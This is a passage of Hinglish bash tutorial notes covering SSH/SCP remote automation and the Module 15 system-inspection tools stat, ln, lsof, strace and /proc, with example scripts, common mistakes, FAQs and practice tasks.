        echo "=== $server ==="
        remote_exec "$server" "$command"
        echo ""
    done
}

# Deploy application
deploy_app() {
    local app_package=$1
    local server=$2
    
    echo "Deploying to $server..."
    
    # Upload package
    scp "$app_package" "$server:/tmp/"
    
    # Extract and deploy
    ssh "$server" <<'EOF'
        cd /tmp
        tar -xzf app.tar.gz
        sudo systemctl stop myapp
        sudo cp -r app/* /var/www/myapp/
        sudo systemctl start myapp
        rm -rf app app.tar.gz
EOF
    
    echo "✓ Deployment complete"
}

# Sync files
sync_files() {
    local source=$1
    local destination=$2
    local server=$3
    
    rsync -avz --delete \
        -e "ssh -o StrictHostKeyChecking=no" \
        "$source" "$server:$destination"
    
    echo "✓ Files synced"
}

# Backup from remote
backup_remote() {
    local server=$1
    local remote_path=$2
    local local_path=$3
    
    echo "Backing up from $server:$remote_path..."
    
    ssh "$server" "tar -czf /tmp/backup.tar.gz $remote_path"
    scp "$server:/tmp/backup.tar.gz" "$local_path/"
    ssh "$server" "rm /tmp/backup.tar.gz"
    
    echo "✓ Backup complete"
}

# Health check all servers
health_check_all() {
    echo "=== Health Check ==="
    
    for server in "${SERVERS[@]}"; do
        echo -n "$server: "
        
        if ssh -o ConnectTimeout=5 "$server" "exit" 2>/dev/null; then
            local uptime=$(ssh "$server" "uptime -p")
            local load=$(ssh "$server" "uptime | awk -F'load average:' '{print \$2}'")
            echo "✓ UP - $uptime - Load:$load"
        else
            echo "✗ DOWN"
        fi
    done
}

# Run script on remote
run_remote_script() {
    local server=$1
    local script=$2
    
    # Upload script
    scp "$script" "$server:/tmp/remote_script.sh"
    
    # Execute
    ssh "$server" "bash /tmp/remote_script.sh"
    
    # Cleanup
    ssh "$server" "rm /tmp/remote_script.sh"
}

# Parallel execution
parallel_exec() {
    local command=$1
    
    for server in "${SERVERS[@]}"; do
        (
            echo "[$server] Starting..."
            ssh "$server" "$command"
            echo "[$server] Complete"
        ) &
    done
    
    wait
    echo "✓ All servers complete"
}

# Collect logs
collect_logs() {
    local log_path=$1
    local dest_dir=$2
    
    mkdir -p "$dest_dir"
    
    for server in "${SERVERS[@]}"; do
        echo "Collecting logs from $server..."
        scp "$server:$log_path" "$dest_dir/${server}_$(date +%Y%m%d).log"
    done
    
    echo "✓ Logs collected"
}

# Update all servers
update_all() {
    echo "=== Updating All Servers ==="
    
    parallel_exec "sudo apt update && sudo apt upgrade -y"
    
    echo "✓ All servers updated"
}

# Monitor resources
monitor_resources() {
    for server in "${SERVERS[@]}"; do
        echo "=== $server ==="
        
        ssh "$server" <<'EOF'
            echo "Disk:"
            df -h / | tail -1
            echo "Memory:"
            free -h | grep Mem
            echo "Load:"
            uptime
EOF
        echo ""
    done
}

main() {
    local action=${1:-help}
    
    case $action in
        deploy)
            deploy_app "$2" "$3"
            ;;
        health)
            health_check_all
            ;;
        exec)
            exec_all "$2"
            ;;
        sync)
            sync_files "$2" "$3" "$4"
            ;;
        monitor)
            monitor_resources
            ;;
        *)
            echo "Usage: $0 {deploy|health|exec|sync|monitor} [args]"
            ;;
    esac
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Password authentication:** SSH keys use karo
- ❌ **Port confuse:** SSH `-p`, SCP `-P`
- ❌ **Path issues:** Absolute paths better

### 10. **Best Practices / Pro Tips**
- 💡 **SSH keys:** Password-less authentication
- 💡 **SSH config:** Shortcuts banao
- 💡 **`rsync` over `scp`:** Better for sync
- 💡 **Parallel execution:** Multiple servers efficiently

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Production deployment automation

readonly SERVERS=("web1" "web2" "web3")
readonly APP_PACKAGE="app_v2.0.tar.gz"

deploy_production() {
    echo "=== Production Deployment ==="
    
    # Health check first
    for server in "${SERVERS[@]}"; do
        if ! ssh "$server" "exit" 2>/dev/null; then
            echo "✗ $server unreachable"
            exit 1
        fi
    done
    
    # Deploy to each server
    for server in "${SERVERS[@]}"; do
        echo "Deploying to $server..."
        
        # Upload
        scp "$APP_PACKAGE" "$server:/tmp/"
        
        # Deploy
        ssh "$server" <<'EOF'
            # Backup current
            sudo tar -czf /backups/app_backup_$(date +%Y%m%d).tar.gz /var/www/app/
            
            # Stop service
            sudo systemctl stop myapp
            
            # Deploy new version
            cd /tmp
            sudo tar -xzf app_v2.0.tar.gz -C /var/www/app/
            
            # Start service
            sudo systemctl start myapp
            
            # Verify
            sleep 5
            if systemctl is-active myapp; then
                echo "✓ Service running"
            else
                echo "✗ Service failed"
                exit 1
            fi
EOF
        
        if [ $? -eq 0 ]; then
            echo "✓ $server deployed successfully"
        else
            echo "✗ $server deployment failed"
            exit 1
        fi
    done
    
    echo "✓ Production deployment complete"
}

deploy_production
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `ssh` remote connection
- ✅ `scp` file transfer
- ✅ SSH keys for automation
- ✅ SSH config for shortcuts
- ✅ Essential for remote management

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Password-less SSH kaise setup karu?**
A: `ssh-keygen` then `ssh-copy-id user@host`

**Q2: SCP vs rsync?**
A: rsync better for sync, resume support, incremental.

**Q3: Multiple servers par parallel kaise?**
A: Background jobs (`&`) aur `wait` use karo.

### 14. **Practice ke liye Task**

```bash
# 1. Connect
ssh user@server.com

# 2. Execute command
ssh user@server.com "ls -la"

# 3. Copy file
scp file.txt user@server.com:/tmp/

# 4. Generate key
ssh-keygen

# 5. Copy key
ssh-copy-id user@server.com

# 6. SSH config
cat >> ~/.ssh/config <<EOF
Host myserver
    HostName server.com
    User john
EOF
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔐 SSH for remote access
- 📁 SCP for file transfer
- 🔑 SSH keys for automation
- ⚙️ SSH config for convenience
- 🚀 Essential for DevOps

> **💡 Ye Zaroor Yaad Rakhein:**
> SSH remote automation ka foundation! SSH keys setup karo password-less ke liye. SSH config shortcuts ke liye. rsync better than scp. Parallel execution powerful!

---

# **🎉 Module 14 Complete! 🎉**

Congratulations! Aapne **Module 14: System Administration & Automation** successfully complete kar liya hai!

## **Aapne Kya Seekha:**
✅ **File Permissions** - rwx, chmod
✅ **chmod** - Permission management
✅ **find** - Advanced file search
✅ **xargs** - Bulk operations
✅ **Process Management** - ps, kill, pgrep
✅ **System Health** - df, free, uptime, ss
✅ **Background Jobs** - &, jobs, fg, bg
✅ **User Management** - useradd, usermod, userdel
✅ **Scheduling** - cron, at, anacron
✅ **Archiving** - tar, gzip, zip
✅ **Remote Automation** - ssh, scp

## **System Admin Essentials:**

```bash
# Permissions
chmod 755 script.sh
find . -perm 777

# Processes
ps aux | grep nginx
kill -9 PID

# System health
df -h && free -h && uptime

# Scheduling
crontab -e
0 2 * * * /backup.sh

# Archiving
tar -czf backup.tar.gz /data/

# Remote
ssh user@server "command"
scp file.txt user@server:/path/
```

## **Best Practices Summary:**
- ✅ 644 files, 755 directories
- ✅ Graceful kill before -9
- ✅ Monitor disk, memory, load
- ✅ Full paths in cron
- ✅ Verify archives
- ✅ SSH keys for automation

## **Production Checklist:**
- [ ] Permissions properly set
- [ ] Monitoring in place
- [ ] Backups scheduled
- [ ] Logs rotated
- [ ] Users audited
- [ ] Remote access secured

## **Common Patterns:**

```bash
# Find and process
find /var/log -name "*.log" -mtime +7 | xargs gzip

# Health check
df -h && free -h && uptime && ss -tulpn

# Backup automation
tar -czf backup_$(date +%Y%m%d).tar.gz /data/

# Remote deployment
scp app.tar.gz server:/tmp/
ssh server "cd /tmp && tar -xzf app.tar.gz"
```

## **Next Steps:**
Aap ab ready hain **Module 15: System Internals & Monitoring** ke liye! Aage seekhenge stat, links, lsof, strace, aur advanced monitoring!

---

**💡 Remember:** System administration responsibility hai! Permissions carefully set karo. Regular monitoring essential. Backups automate karo. Remote access secure rakho. Production mein test pehle! 🚀

---

=============================================================

# **Bash Shell Scripting: Zero-to-Automation Notes (Module 15)**

---

## **PART 4: ADVANCED TOOLS & REAL-WORLD AUTOMATION**

---

# **Module 15: System Internals & Monitoring**

---

## **Topic 1: `stat` Command (Timestamps: atime, mtime, ctime)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**stat** - File metadata aur timestamps detailed view.

### 2. **Ye Kya Hai? (What is it?)**
`stat` command file ki detailed information dikhata hai including timestamps: atime (access time), mtime (modification time), ctime (change time), permissions, size, inode. File forensics ke liye essential.

**Analogy:** stat ek file ka passport hai - sab details ek jagah: kab bani, kab modify hui, kab access hui.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Forensics** - File history track
- ✅ **Debugging** - Timestamp issues
- ✅ **Auditing** - Access tracking
- ✅ **Troubleshooting** - File problems diagnose

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- File history chahiye
- Timestamp debugging
- Security audits
- Backup verification

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Missed file changes
- Audit gaps
- Debugging difficulties
- Security issues

### 6. **Syntax aur Common Options**

```bash
# Basic stat
stat file.txt

# Specific format
stat -c %a file.txt         # Permissions (octal)
stat -c %U file.txt         # Owner
stat -c %s file.txt         # Size
stat -c %y file.txt         # Modification time

# Timestamps
stat -c %x file.txt         # Access time (atime)
stat -c %y file.txt         # Modify time (mtime)
stat -c %z file.txt         # Change time (ctime)
```

### 7. **Example 1 (Basic)**

```bash
# Full stat output
stat file.txt
# Output:
#   File: file.txt
#   Size: 1234      Blocks: 8       IO Block: 4096
#   Access: 2024-01-15 10:30:45
#   Modify: 2024-01-15 10:25:30
#   Change: 2024-01-15 10:25:30

# Get permissions
stat -c %a file.txt
# Output: 644

# Get owner
stat -c %U file.txt
# Output: john

# Get size
stat -c %s file.txt
# Output: 1234

# Get modification time
stat -c %y file.txt
# Output: 2024-01-15 10:25:30

# Compare timestamps
stat -c "Access: %x, Modify: %y" file.txt
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# File timestamp analysis

set -euo pipefail

# Analyze file timestamps
analyze_timestamps() {
    local file=$1
    
    echo "=== File: $file ==="
    
    local atime=$(stat -c %x "$file")
    local mtime=$(stat -c %y "$file")
    local ctime=$(stat -c %z "$file")
    
    echo "Access time:  $atime"
    echo "Modify time:  $mtime"
    echo "Change time:  $ctime"
    
    # Check if recently accessed
    local atime_epoch=$(stat -c %X "$file")
    local now=$(date +%s)
    local diff=$((now - atime_epoch))
    
    if [ $diff -lt 3600 ]; then
        echo "⚠️  Accessed in last hour"
    fi
}

# Find recently modified files
find_recent_changes() {
    local dir=${1:-.}
    local hours=${2:-24}
    
    echo "=== Files modified in last $hours hours ==="
    
    find "$dir" -type f -mtime -1 -exec stat -c "%y %n" {} \; | sort -r
}

# Find files by access time
find_by_access() {
    local dir=$1
    local days=$2
    
    echo "=== Files not accessed in $days days ==="
    
    find "$dir" -type f -atime +$days -exec stat -c "%x %n" {} \;
}

# Compare file timestamps
compare_files() {
    local file1=$1
    local file2=$2
    
    local mtime1=$(stat -c %Y "$file1")
    local mtime2=$(stat -c %Y "$file2")
    
    if [ $mtime1 -gt $mtime2 ]; then
        echo "$file1 is newer"
    elif [ $mtime1 -lt $mtime2 ]; then
        echo "$file2 is newer"
    else
        echo "Both files have same modification time"
    fi
}

main() {
    analyze_timestamps "${1:-/etc/passwd}"
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **atime vs mtime confuse:** Access vs modification
- ❌ **ctime misunderstand:** Metadata change, not creation
- ❌ **Format strings galat:** `-c` option syntax

### 10. **Best Practices / Pro Tips**
- 💡 **`-c` for custom format:** Specific info extract
- 💡 **Epoch time for comparison:** `%X`, `%Y`, `%Z`
- 💡 **Combine with find:** Powerful searches
- 💡 **Script automation:** Timestamp tracking

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Security audit - file access tracking

audit_sensitive_files() {
    local files=(
        "/etc/passwd"
        "/etc/shadow"
        "/etc/ssh/sshd_config"
    )
    
    echo "=== Sensitive File Audit ==="
    
    for file in "${files[@]}"; do
        echo "File: $file"
        
        local mtime=$(stat -c %y "$file")
        local ctime=$(stat -c %z "$file")
        
        echo "  Last modified: $mtime"
        echo "  Last changed:  $ctime"
        
        # Check if modified recently
        local mtime_epoch=$(stat -c %Y "$file")
        local now=$(date +%s)
        local days=$(( (now - mtime_epoch) / 86400 ))
        
        if [ $days -lt 7 ]; then
            echo "  ⚠️  Modified in last 7 days!"
        fi
        
        echo ""
    done
}

audit_sensitive_files
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `stat` shows file metadata
- ✅ atime = access time
- ✅ mtime = modification time
- ✅ ctime = change time
- ✅ `-c` for custom format

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: ctime file creation time hai?**
A: Nahi, metadata change time hai. Linux mein creation time track nahi hota.

**Q2: atime update kab hota hai?**
A: File read karne par (but relatime mount option se limited).

**Q3: Timestamps kaise preserve karu?**
A: `cp -p` ya `rsync -a` use karo.

### 14. **Practice ke liye Task**

```bash
# 1. Full stat
stat file.txt

# 2. Get permissions
stat -c %a file.txt

# 3. Get timestamps
stat -c "Access: %x, Modify: %y" file.txt

# 4. Find recent
find . -mtime -1 -exec stat -c "%y %n" {} \;

# 5. Compare
stat -c %Y file1.txt
stat -c %Y file2.txt
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📊 stat shows detailed file info
- ⏰ atime, mtime, ctime timestamps
- 🔍 `-c` for custom format
- 📅 Epoch time for comparisons
- 🎯 Essential for forensics

> **💡 Ye Zaroor Yaad Rakhein:**
> stat file ki complete history! atime access, mtime modification, ctime metadata change. `-c` custom format ke liye. Forensics aur auditing mein powerful!

---

## **Topic 2: Links (`ln` - Hard vs Soft, Inodes)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Links** - Files ko link karna: hard links aur symbolic links.

### 2. **Ye Kya Hai? (What is it?)**
Links files ko reference karte hain. Hard link same inode share karta hai (same file, different name), symbolic link ek pointer hai (shortcut). Inodes filesystem ka unique identifier.

**Analogy:** Hard link ek person ke do names hain, symbolic link ek signboard hai jo location point karta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Space saving** - Same data, multiple locations
- ✅ **Flexibility** - Easy access
- ✅ **Backup** - Data redundancy
- ✅ **Organization** - Logical structure

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Multiple access points
- Space optimization
- Backup strategies
- Directory shortcuts

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Duplicate files (space waste)
- Broken references
- Confusion
- Inefficient organization

### 6. **Syntax aur Common Options**

```bash
# Hard link
ln source.txt hardlink.txt

# Symbolic (soft) link
ln -s source.txt symlink.txt
ln -s /path/to/dir linkdir

# View links
ls -li                  # Show inodes
ls -l                   # Show link target

# Find links
find . -inum INODE      # Find by inode
find . -type l          # Find symlinks
```

### 7. **Example 1 (Basic)**

```bash
# Create hard link
ln original.txt hardlink.txt
ls -li
# Same inode number for both

# Create symbolic link
ln -s original.txt symlink.txt
ls -l symlink.txt
# Output: symlink.txt -> original.txt

# Hard link to directory (not allowed)
ln /dir /link  # Error

# Symbolic link to directory (allowed)
ln -s /var/www/html website

# View inode
ls -i file.txt
stat -c %i file.txt

# Find all hard links
find . -inum $(stat -c %i file.txt)

# Check if symlink
[ -L symlink.txt ] && echo "Is symlink"

# Read link target
readlink symlink.txt
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Link management script

set -euo pipefail

# Create backup with hard link
backup_hardlink() {
    local file=$1
    local backup="${file}.backup"
    
    ln "$file" "$backup"
    echo "✓ Hard link backup created: $backup"
}

# Create symbolic link
create_symlink() {
    local target=$1
    local link=$2
    
    if [ -e "$link" ]; then
        echo "⚠️  Link already exists: $link"
        return 1
    fi
    
    ln -s "$target" "$link"
    echo "✓ Symbolic link created: $link -> $target"
}

# Find broken symlinks
find_broken_links() {
    local dir=${1:-.}
    
    echo "=== Broken Symbolic Links ==="
    
    find "$dir" -type l ! -exec test -e {} \; -print
}

# Count hard links
count_hardlinks() {
    local file=$1
    
    local links=$(stat -c %h "$file")
    echo "File has $links hard link(s)"
    
    if [ $links -gt 1 ]; then
        local inode=$(stat -c %i "$file")
        echo "Other links:"
        find / -inum "$inode" 2>/dev/null | grep -v "^$file$"
    fi
}

# Replace file with symlink
replace_with_symlink() {
    local file=$1
    local target=$2
    
    if [ ! -f "$file" ]; then
        echo "✗ File not found: $file"
        return 1
    fi
    
    # Backup original
    mv "$file" "${file}.orig"
    
    # Create symlink
    ln -s "$target" "$file"
    
    echo "✓ Replaced with symlink"
}

# Cleanup broken links
cleanup_broken_links() {
    local dir=$1
    
    echo "Cleaning up broken links in $dir..."
    
    find "$dir" -type l ! -exec test -e {} \; -delete
    
    echo "✓ Broken links removed"
}

main() {
    local action=${1:-help}
    
    case $action in
        broken)
            find_broken_links "$2"
            ;;
        count)
            count_hardlinks "$2"
            ;;
        cleanup)
            cleanup_broken_links "$2"
            ;;
        *)
            echo "Usage: $0 {broken|count|cleanup} [path]"
            ;;
    esac
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Hard link to directory:** Not allowed
- ❌ **Symlink path relative:** Absolute paths better
- ❌ **Delete confusion:** Hard link delete doesn't affect others

### 10. **Best Practices / Pro Tips**
- 💡 **Symlinks for directories:** Hard links not allowed
- 💡 **Absolute paths:** Symlinks ke liye safer
- 💡 **Check broken links:** Regular cleanup
- 💡 **Understand inodes:** Hard links same inode

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Web deployment with symlinks

deploy_version() {
    local version=$1
    local app_dir="/var/www/app"
    local releases_dir="/var/www/releases"
    local current_link="/var/www/current"
    
    echo "Deploying version $version..."
    
    # Extract new version
    tar -xzf "app_v${version}.tar.gz" -C "$releases_dir"
    
    # Create symlink to new version
    ln -sfn "$releases_dir/app_v${version}" "$current_link"
    
    # Nginx serves from /var/www/current
    systemctl reload nginx
    
    echo "✓ Version $version deployed"
}

# Rollback
rollback() {
    local previous=$(readlink /var/www/previous)
    ln -sfn "$previous" /var/www/current
    systemctl reload nginx
    echo "✓ Rolled back"
}

deploy_version "2.0"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ Hard link: same inode
- ✅ Symlink: pointer/shortcut
- ✅ `ln` for hard, `ln -s` for soft
- ✅ Symlinks can cross filesystems
- ✅ Check broken links regularly

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Hard link vs symbolic link?**
A: Hard = same file, Symbolic = pointer to file.

**Q2: Hard link delete karne par?**
A: Data tab tak safe jab tak ek link bhi hai.

**Q3: Symlink broken kab hota hai?**
A: Jab target file delete ho jaye.

### 14. **Practice ke liye Task**

```bash
# 1. Create hard link
ln file.txt hardlink.txt

# 2. Create symlink
ln -s file.txt symlink.txt

# 3. View inodes
ls -li

# 4. Find broken links
find . -type l ! -exec test -e {} \; -print

# 5. Count links
stat -c %h file.txt

# 6. Read link
readlink symlink.txt
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔗 Hard link = same inode
- 📌 Symlink = pointer
- 💾 Hard links save space
- 🔄 Symlinks flexible
- 🎯 Essential for deployments

> **💡 Ye Zaroor Yaad Rakhein:**
> Links powerful feature! Hard link same data, symlink pointer. Symlinks directories ke liye. Absolute paths safer. Broken links check karo regularly!

---

## **Topic 3: `lsof` (List Open Files, `-i` for network, `-p` for process)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**lsof** - List open files aur network connections.

### 2. **Ye Kya Hai? (What is it?)**
`lsof` (List Open Files) command open files, network connections, aur processes show karta hai. `-i` network connections, `-p` specific process. Debugging aur monitoring ka powerful tool.

**Analogy:** lsof ek X-ray machine hai jo system ke andar kya chal raha hai dikhata hai - kaun kya file use kar raha hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Debugging** - File locks identify
- ✅ **Network monitoring** - Active connections
- ✅ **Security** - Suspicious activity detect
- ✅ **Troubleshooting** - "File in use" issues

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- File locked hai
- Port already in use
- Network debugging
- Process investigation

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Debugging difficulties
- Missed security issues
- Resource leaks
- Troubleshooting delays

### 6. **Syntax aur Common Options**

```bash
# Basic usage
lsof                    # All open files
lsof /path/to/file      # Who's using this file
lsof -u username        # User's open files

# Network
lsof -i                 # All network connections
lsof -i :80             # Port 80
lsof -i TCP             # TCP connections
lsof -i @host           # Connections to host

# Process
lsof -p PID             # Files opened by process
lsof -c command         # Files by command name

# Combined
lsof -i -u username     # User's network connections
```

### 7. **Example 1 (Basic)**

```bash
# All open files (huge output)
lsof | head -20

# Who's using a file
lsof /var/log/syslog

# User's open files
lsof -u john

# Network connections
lsof -i
lsof -i :80             # Port 80
lsof -i :22             # SSH
lsof -i TCP:80          # TCP port 80

# Process files
lsof -p 1234

# Command files
lsof -c nginx

# Find process using port
lsof -i :8080

# Deleted but open files
lsof | grep deleted

# Count open files
lsof | wc -l
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# System monitoring with lsof

set -euo pipefail

# Find process using port
find_port_user() {
    local port=$1
    
    echo "=== Port $port Usage ==="
    
    lsof -i ":$port" -P -n
}

# Network connections by user
user_connections() {
    local user=$1
    
    echo "=== Network Connections for $user ==="
    
    lsof -i -u "$user" -P -n
}

# Find deleted but open files
find_deleted_files() {
    echo "=== Deleted but Open Files ==="
    
    lsof | grep deleted | awk '{print $1, $2, $9}'
}

# Monitor file access
monitor_file() {
    local file=$1
    
    echo "Monitoring access to: $file"
    
    while true; do
        local users=$(lsof "$file" 2>/dev/null | tail -n +2 | awk '{print $1, $2}')
        
        if [ -n "$users" ]; then
            echo "[$(date)] File in use by: $users"
        fi
        
        sleep 5
    done
}

# Check port availability
check_port() {
    local port=$1
    
    if lsof -i ":$port" >/dev/null 2>&1; then
        echo "⚠️  Port $port is in use"
        lsof -i ":$port" -P -n
        return 1
    else
        echo "✓ Port $port is available"
        return 0
    fi
}

# List all listening ports
list_listening() {
    echo "=== Listening Ports ==="
    
    lsof -i -P -n | grep LISTEN | awk '{print $1, $3, $9}' | sort -u
}

# Process network activity
process_network() {
    local pid=$1
    
    echo "=== Network Activity for PID $pid ==="
    
    lsof -i -a -p "$pid" -P -n
}

# Find large open files
find_large_files() {
    echo "=== Large Open Files ==="
    
    lsof -s | awk '$7 ~ /^[0-9]+$/ && $7 > 100000000 {print $1, $2, $7, $9}'
}

main() {
    local action=${1:-help}
    
    case $action in
        port)
            find_port_user "$2"
            ;;
        user)
            user_connections "$2"
            ;;
        deleted)
            find_deleted_files
            ;;
        listening)
            list_listening
            ;;
        *)
            echo "Usage: $0 {port|user|deleted|listening} [args]"
            ;;
    esac
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Root access bhoolna:** Many files need sudo
- ❌ **Output overwhelming:** Filter use karo
- ❌ **Port format galat:** `:80` not `80`

### 10. **Best Practices / Pro Tips**
- 💡 **`-P` for ports:** Numeric ports show
- 💡 **`-n` for IPs:** Numeric IPs (faster)
- 💡 **Combine options:** `-i -u username`
- 💡 **Grep for filtering:** Output filter karo

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Port conflict resolver

resolve_port_conflict() {
    local port=$1
    
    echo "Checking port $port..."
    
    if lsof -i ":$port" >/dev/null 2>&1; then
        echo "⚠️  Port $port is in use:"
        
        # Show details
        lsof -i ":$port" -P -n
        
        # Get PID
        local pid=$(lsof -t -i ":$port")
        
        echo ""
        read -p "Kill process $pid? (y/n): " confirm
        
        if [ "$confirm" = "y" ]; then
            kill "$pid"
            echo "✓ Process killed"
        fi
    else
        echo "✓ Port $port is available"
    fi
}

resolve_port_conflict 8080
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `lsof` lists open files
- ✅ `-i` for network
- ✅ `-p` for process
- ✅ `-u` for user
- ✅ Essential for debugging

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: lsof slow kyun hai?**
A: Bahut saari files check karta hai. `-n` use karo faster ke liye.

**Q2: Port kaun use kar raha hai?**
A: `lsof -i :PORT`

**Q3: Deleted files space kyun le rahi hain?**
A: Process ne file open rakhi hai. `lsof | grep deleted`

### 14. **Practice ke liye Task**

```bash
# 1. All network
lsof -i

# 2. Specific port
lsof -i :80

# 3. User files
lsof -u username

# 4. Process files
lsof -p PID

# 5. Find port user
lsof -i :8080

# 6. Listening ports
lsof -i | grep LISTEN
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📂 lsof lists open files
- 🌐 `-i` for network connections
- 🔍 `-p` for specific process
- 🚪 Find port conflicts
- 🎯 Essential debugging tool

> **💡 Ye Zaroor Yaad Rakhein:**
> lsof debugging ka powerhouse! Port conflicts ke liye `-i :PORT`. Process files ke liye `-p PID`. Network monitoring ke liye `-i`. Root access zaroori!

---

## **Topic 4: `strace` & `ltrace` (System/Library Call Tracer, `-p` for process)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**strace & ltrace** - System aur library calls trace karna.

### 2. **Ye Kya Hai? (What is it?)**
`strace` system calls trace karta hai (kernel interactions), `ltrace` library calls trace karta hai (function calls). `-p` running process attach karta hai. Deep debugging ke liye essential.

**Analogy:** strace/ltrace ek microscope hai jo program ke har step ko detail mein dikhata hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Deep debugging** - Internal behavior
- ✅ **Performance** - Slow calls identify
- ✅ **Security** - Suspicious activity
- ✅ **Understanding** - Program flow

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Program hang
- Performance issues
- Security analysis
- Learning behavior

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Deep debugging impossible
- Performance bottlenecks missed
- Security issues undetected
- Limited troubleshooting

### 6. **Syntax aur Common Options**

```bash
# strace
strace command
strace -p PID
strace -c command
strace -e open command
strace -o output.txt command

# ltrace
ltrace command
ltrace -p PID
ltrace -c command
```

### 7. **Example 1 (Basic)**

```bash
# Trace command
strace ls

# Count calls
strace -c ls

# Attach to process
strace -p 1234

# Specific calls
strace -e open,read ls

# Save output
strace -o trace.log ls

# ltrace
ltrace ls
ltrace -c ls
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Tracing and analysis

trace_program() {
    local program=$1
    strace -o "/tmp/trace_$$.log" -c "$program"
}

find_slow_calls() {
    local pid=$1
    timeout 5 strace -p "$pid" -T 2>&1 | grep -E '<[0-9]+\.[0-9]+>'
}

main() {
    trace_program "${1:-ls}"
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Output overwhelming:** Filter use karo
- ❌ **Performance impact:** Production carefully
- ❌ **Permissions:** Root access zaroori

### 10. **Best Practices / Pro Tips**
- 💡 **`-e` for filtering:** Specific calls
- 💡 **`-c` for summary:** Quick overview
- 💡 **`-T` for timing:** Performance
- 💡 **Save output:** `-o file`

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Debug hanging application

debug_hang() {
    local pid=$1
    timeout 10 strace -p "$pid" -o /tmp/hang_trace.log
    tail -20 /tmp/hang_trace.log
}

debug_hang 1234
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ strace for system calls
- ✅ ltrace for library calls
- ✅ `-p` attach to process
- ✅ `-c` for summary
- ✅ Deep debugging tool

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: strace vs ltrace?**
A: strace system calls, ltrace library calls.

**Q2: Production mein safe hai?**
A: Performance impact hai, carefully use.

**Q3: Output kaise filter karu?**
A: `-e` option use karo.

### 14. **Practice ke liye Task**

```bash
# 1. Basic trace
strace ls

# 2. Count calls
strace -c ls

# 3. Specific calls
strace -e open ls

# 4. Attach
strace -p PID

# 5. Library trace
ltrace ls
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔬 strace traces system calls
- 📚 ltrace traces library calls
- 🎯 `-p` attaches to process
- 📊 `-c` shows summary
- 🐛 Essential for debugging

> **💡 Ye Zaroor Yaad Rakhein:**
> strace/ltrace deep debugging! strace system, ltrace library. `-e` filter. Production carefully. Performance impact!

---

## **Topic 5: `/proc` & `/sys` Filesystems (Concept)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**/proc & /sys** - Virtual filesystems for system information.

### 2. **Ye Kya Hai? (What is it?)**
`/proc` aur `/sys` virtual filesystems hain jo kernel aur system information expose karte hain as files. Runtime information accessible.

**Analogy:** /proc aur /sys control panel - har setting file format mein.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **System info** - Runtime information
- ✅ **Process details** - Per-process data
- ✅ **Kernel tuning** - Parameters modify
- ✅ **Hardware info** - Device details

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- System information
- Process debugging
- Kernel tuning
- Hardware inspection

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Limited visibility
- Manual gathering
- Inefficient monitoring
- Missed optimization

### 6. **Syntax aur Common Options**

```bash
# /proc
cat /proc/cpuinfo
cat /proc/meminfo
cat /proc/uptime
cat /proc/PID/cmdline
cat /proc/PID/status

# /sys
cat /sys/class/net/eth0/address
cat /sys/block/sda/size
```

### 7. **Example 1 (Basic)**

```bash
# CPU info
cat /proc/cpuinfo | grep "model name"

# Memory
cat /proc/meminfo | grep MemTotal

# Uptime
cat /proc/uptime

# Process
cat /proc/1234/cmdline

# Network
ls /sys/class/net/

